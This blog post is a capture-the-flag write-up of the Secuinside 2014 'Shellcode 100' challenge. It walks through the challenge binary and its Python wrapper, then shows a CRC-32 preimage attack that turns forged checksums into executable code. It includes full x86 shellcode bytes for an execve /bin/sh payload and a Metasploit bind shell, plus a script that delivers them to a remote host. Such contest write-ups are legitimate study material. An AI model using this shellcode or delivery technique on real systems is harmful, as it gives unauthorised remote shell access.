---
layout: post
title: "Secuinside Quals 2014: Shellcode 100"
date: 2014-06-02 04:57:01 +0000
permalink: /2014/06/02/secuinside-quals-2014-shellcode-100/
category: Security
tags:
  - CTF
  - Secuinside
  - Security
---
This is a level that, at first, seemed like it would be extremely simple, but then turned out to be far more complicated than expected.  We were provided a zip file containing a python script and an elf binary.

Disassembling the binary reveals a very basic program:

    / (fcn) sym.main 165
    |                0x0804847d    55           push ebp
    |                0x0804847e    89e5         mov ebp, esp
    |                0x08048480    83e4f0       and esp, 0xfffffff0
    |                0x08048483    83ec30       sub esp, 0x30
    |                0x08048486    8b450c       mov eax, [ebp+0xc]
    |                0x08048489    83c004       add eax, 0x4
    |                0x0804848c    8b00         mov eax, [eax]
    |                0x0804848e    890424       mov [esp], eax
    |                ; CODE (CALL) XREF from 0x08048376 (fcn.08048376)
    |                ; CODE (CALL) XREF from 0x08048370 (fcn.08048366)
    |                0x08048491    e8dafeffff   call 0x108048370 ; (sym.imp.atoi)
    |                   sym.imp.atoi(unk)
    |                0x08048496    89442428     mov [esp+0x28], eax
    |                0x0804849a    c7442424000. mov dword [esp+0x24], 0x0
    |                0x080484a2    c7442408040. mov dword [esp+0x8], 0x4
    |                0x080484aa    8d442424     lea eax, [esp+0x24]
    |                0x080484ae    89442404     mov [esp+0x4], eax
    |                0x080484b2    8b442428     mov eax, [esp+0x28]
    |                0x080484b6    890424       mov [esp], eax
    |                ; CODE (CALL) XREF from 0x08048330 (fcn.0804832c)
    |                0x080484b9    e872feffff   call 0x108048330 ; (sym.imp.read)
    |                   sym.imp.read()
    |                0x080484be    8b442424     mov eax, [esp+0x24]
    |                0x080484c2    c7442414000. mov dword [esp+0x14], 0x0
    |                0x080484ca    c7442410fff. mov dword [esp+0x10], 0xffffffff
    |                0x080484d2    c744240c220. mov dword [esp+0xc], 0x22
    |                0x080484da    c7442408070. mov dword [esp+0x8], 0x7
    |                0x080484e2    89442404     mov [esp+0x4], eax
    |                0x080484e6    c7042400000. mov dword [esp], 0x0
    |                ; CODE (CALL) XREF from 0x08048350 (fcn.08048346)
    |                0x080484ed    e85efeffff   call 0x108048350 ; (sym.imp.mmap)
    |                   sym.imp.mmap()
    |                0x080484f2    8944242c     mov [esp+0x2c], eax
    |                0x080484f6    8b442424     mov eax, [esp+0x24]
    |                0x080484fa    89442408     mov [esp+0x8], eax
    |                0x080484fe    8b44242c     mov eax, [esp+0x2c]
    |                0x08048502    89442404     mov [esp+0x4], eax
    |                0x08048506    8b442428     mov eax, [esp+0x28]
    |                0x0804850a    890424       mov [esp], eax
    |                0x0804850d    e81efeffff   call 0x108048330 ; (sym.imp.read)
    |                   sym.imp.read()
    |                0x08048512    31c0         xor eax, eax
    |                0x08048514    31c9         xor ecx, ecx
    |                0x08048516    31d2         xor edx, edx
    |                0x08048518    31db         xor ebx, ebx
    |                0x0804851a    31f6         xor esi, esi
    |                0x0804851c    31ff         xor edi, edi
    \                0x0804851e    ff64242c     jmp dword [esp+0x2c]

It takes a single argument, an integer, which it uses as a file descriptor for input.  It then reads 4 bytes from the file descriptor, mmap's an anonymous block of memory of that size with RWX permissions, then reads that many bytes from the file descriptor into the mapped region, and finally jumps to the map region.  So, in summary, read shellcode length, read shellcode, then jump to shellcode.

So, let's look at the python script responsible for launching the program and reading the input.

    #!/usr/bin/python
    import os, signal, struct, binascii
    from sys import stdin, stdout
    
    UI = lambda a : struct.unpack('I', a)[0]
    PI = lambda a : struct.pack('I', a)
    
    def crc32(data, salt) :
        return PI(binascii.crc32(salt + data) & 0xffffffff)
    
    def main() :
        signal.alarm(25)
    
        salt = os.urandom(10)
        print 'salt:', salt.encode('hex')
        stdout.flush()
    
        n = UI(stdin.read(4))
        data = ''.join(crc32(stdin.read(UI(stdin.read(4))), salt) for _ in xrange(n))
    
        fi, fo = os.pipe()
        if not os.fork() :
            os.execl('/home/sc/thisisnotbad', 'thisisnotbad', '%d' % fi)
        else :
            os.write(fo, PI(len(data)))
            os.write(fo, data)
    
    if __name__ == '__main__' :
        main()

As you can tell, it provides a 10 byte salt, then reads in 4 bytes (`n`), then finally reads `n` blocks prefixed by a 4-byte length.  Next, for each block, it computes the crc32 of the block with the salt prepended.  Finally, the crc32s are concatenated as the shellcode to be executed.

So, to get useful shellcode, we have to mount a preimage attack on CRC-32.  Fortunately, CRC-32 is not a cryptographically secure hash, and [Julien Tinnes has done the heavy lifting for us](https://code.google.com/p/tweakcrc/).  So, we can take our shellcode as the desired CRC32s and compute the preimage of salt+preimage vector (4 bytes), then break the result into 4 byte chunks and send them along with appropriate lengths.

I wrote a little C program to use the calcvect.c from tweakcrc to compute the preimages given the salt, then used python for all the socket communications. (Because why do sockets in C when you can avoid it?)

    #!c
    #include "crc32.h"
    #include <string.h>
    #include <stdio.h>
    #include <arpa/inet.h>
    
    /*
    const char *shellcode = "\x31\xc0\x50\x68"
                            "\x2f\x2f\x73\x68"
                            "\x68\x2f\x62\x69"
                            "\x6e\x89\xe3\x50"
                            "\x53\x89\xe1\xb0"
                            "\x0b\xcd\x80\x90";
    */
    
    unsigned char shellcode[] = 
    "\x31\xdb\xf7\xe3\x53\x43\x53\x6a"
    "\x02\x89\xe1\xb0\x66\xcd\x80\x5b"
    "\x5e\x52\x68\x02\x00\x16\x9d\x6a"
    "\x10\x51\x50\x89\xe1\x6a\x66\x58"
    "\xcd\x80\x89\x41\x04\xb3\x04\xb0"
    "\x66\xcd\x80\x43\xb0\x66\xcd\x80"
    "\x93\x59\x6a\x3f\x58\xcd\x80\x49"
    "\x79\xf8\x68\x2f\x2f\x73\x68\x68"
    "\x2f\x62\x69\x6e\x89\xe3\x50\x53"
    "\x89\xe1\xb0\x0b\xcd\x80\x90\x90";
    
    
    #define SC_LEN 80
    #define CHUNK_SIZE 4
    
    char shellcode_out[SC_LEN];
    
    char tmpbuf[14];
    
    unsigned int    tweakcrc(void *map, int length, unsigned int target, unsigned int offset);
    
    
    void decode_hex(char *dst, const char *src) {
      int i;
      for (i=0; i<strlen(src)/2; i ++)
        sscanf(&(src[i*2]), "%2hhx", &dst[i]);
    }
    
    
    int main(int argc, char **argv) {
      int i;
      int target;
      decode_hex(tmpbuf, argv[1]);
      gen_table();
    
      for (i=0; i<(SC_LEN/CHUNK_SIZE); i++){
        *(int *)(tmpbuf + 10) = 0;
        //for (k=0; k<14; k++)
          //fprintf(stderr, "%02hhx", tmpbuf[k]);
        //fprintf(stderr, "\n");
        target = *((int *)&shellcode[i*CHUNK_SIZE]);
        //target = htonl(target);
        //fprintf(stderr, "Target: %08x\n", target);
        tweakcrc(tmpbuf, 14, target, 10);
        
        //for (k=0; k<14; k++)
          //fprintf(stderr, "%02hhx", tmpbuf[k]);
        //fprintf(stderr, "\n");
        memcpy(&shellcode_out[i*CHUNK_SIZE], tmpbuf+10, 4);
      }
    
      for (i=0; i<SC_LEN; i++)
        printf("%02hhx", shellcode_out[i]);
      printf("\n");
      return 0;
    }

You might notice a commented out shellcode.  At first, I just tried a basic x86 shell exec, but stdin/stdout do not seem to connect through to the shellcode.  I didn't dig into why, just replaced my shellcode with `linux/x86/shell_bind_tcp` from Metasploit.  

To chunk and send my payload:

    #!python
    import socket
    import subprocess
    import struct
    import binascii
    
    
    def crc32(data, salt):
      #print (salt+data).encode('hex')
      v = struct.pack('I', binascii.crc32(salt + data) & 0xffffffff)
      #print v.encode('hex')
      return v
    
    REMOTE = ('54.178.232.195', 5757)
    #REMOTE = ('localhost', 5555)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(REMOTE)
    print 'Connected.'
    salt = s.recv(1024).strip().split(':')[1].strip()
    print 'Salt: %s' % salt
    
    shellcode = subprocess.check_output(
        ('./shellcode', salt)).strip()
    print 'Shellcode: %s' % shellcode
    shellcode = shellcode.decode('hex')
    
    def send(what):
      print what.encode('hex')
      return s.send(what)
    
    def chunks(sc):
      return [sc[x:x+4] for x in xrange(0, len(sc), 4)]
    
    nc = len(shellcode)/4
    
    shellcode = ''.join('\x04\x00\x00\x00' + c for c in chunks(shellcode))
    
    l = send(struct.pack('I', nc) + shellcode)
    print 'Shellcode %d done.' % l

You might notice both programs have a lot of debugging print statements.  Getting the endianness just right, tweaking the payload chunking, etc., consumed far more time than figuring out what the problem was.
